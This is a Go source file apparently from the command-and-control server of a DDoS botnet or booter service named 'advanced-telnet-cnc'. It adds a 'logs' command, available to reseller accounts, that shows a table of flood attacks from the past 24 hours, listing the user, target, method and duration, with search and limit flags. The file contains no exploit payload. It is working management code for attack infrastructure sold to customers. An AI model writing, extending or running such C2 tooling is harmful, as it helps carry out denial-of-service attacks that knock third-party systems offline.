package admin

import (
	"advanced-telnet-cnc/packages/format"
	"advanced-telnet-cnc/packages/pflag"
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"strings"
	"time"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"attacklogs", "logs"},
		Description: "Displays logs of all previous attacks.",
		Admin:       false,
		Reseller:    true,
		Usage:       nil,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			var searchQuery string
			var limit int

			flagSet := pflag.NewFlagSet("logs", pflag.ContinueOnError)
			flagSet.SetOutput(session.Conn)

			flagSet.StringVarP(&searchQuery, "search", "s", "", "Search for a specific target or method.")
			flagSet.IntVarP(&limit, "limit", "l", 20, "Limit the number of logs shown.")

			err := flagSet.Parse(args)
			if err != nil {
				if err == pflag.ErrHelp {
					return nil
				}
				return session.Println(config.Red, "Could not parse command flags.")
			}

			floods, err := database.FloodsDuring(24 * time.Hour) // Show last 24 hours
			if err != nil {
				return err
			}

			if len(floods) == 0 {
				return session.Println("No attack logs found in the last 24 hours.")
			}

			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "User"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Method"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Time"},
				},
			}

			count := 0
			for i := len(floods) - 1; i >= 0; i-- {
				flood := floods[i]
				if count >= limit {
					break
				}

				user, err2 := database.UserFromId(flood.UserId)
				if err2 != nil {
					continue
				}

				if user == nil {
					continue
				}

				if searchQuery != "" && !strings.Contains(strings.ToLower(flood.Target), strings.ToLower(searchQuery)) && !strings.Contains(strings.ToLower(flood.Method), strings.ToLower(searchQuery)) {
					continue
				}

				if len(flood.Target) > 20 {
					flood.Target = flood.Target[:17] + "..."
				}

				table.Body.Cells = append(table.Body.Cells, []*simpletable.Cell{
					{Text: fmt.Sprintf("%d", count+1)},
					{Text: user.Name},
					{Text: flood.Target},
					{Text: flood.Method},
					{Text: fmt.Sprintf("%ds", flood.Duration)},
					{Text: format.Format(flood.End)},
				})
				count++
			}

			if count == 0 {
				return session.Println("No logs matching your search were found.")
			}

			table.SetStyle(simpletable.StyleCompactLite)
			return session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
		},
	})
}
